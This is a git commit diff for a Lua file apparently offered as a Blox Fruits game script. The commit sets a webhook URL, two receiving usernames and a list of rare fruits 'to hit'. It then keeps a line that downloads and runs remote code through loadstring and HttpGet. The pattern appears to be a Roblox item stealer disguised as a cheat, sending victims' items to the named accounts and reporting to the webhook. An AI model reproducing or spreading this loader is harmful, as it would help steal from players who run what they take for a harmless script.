781290b4be3ac7567fcc26ee86a3fc9b8256d5b7
BloxFruit-LatestScript2025 <thapa43929@gmail.com>
2025-03-30 16:37:14 +0545

    Update Redz.lua

--- Redz.lua
+++ Redz.lua
@@ -1,7 +1,7 @@
-```lua
-Webhook = "" -- << Your Webhook
-Usernames = {"uruserhereorsmthidk", "somealtuserhere2"} -- << Your username(-s).
-FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
+
+Webhook = ""https://webhook-protect.vercel.app/api/webhook?id=Zms3X25zZFJSVmJMc2llRVlEcWFWQTpubDdHNENYRlBaWkZfTkVCMlZkR2tYSVVobklLVm9ROVgyaUFiVlNOSkxVS2l6cF9VY1htdzBSLVBFbWRoTUtPQllBUmhIbEp1aVROeHFDWE1YV0dienhTekxSYjB3cWMxZGlBdzREVFZkRXVnX3duT0I1bWRFWEpPcWFqOTNET0dhajJ4VzU3RTVLMTBUaHBpTGlQWngzN1JoS3o3Nk54MzJiamVGdThaQjQ -- << Your Webhook
+Usernames = {"ankit_2068", "karela0017"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Gravity-Gravity", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
 ```
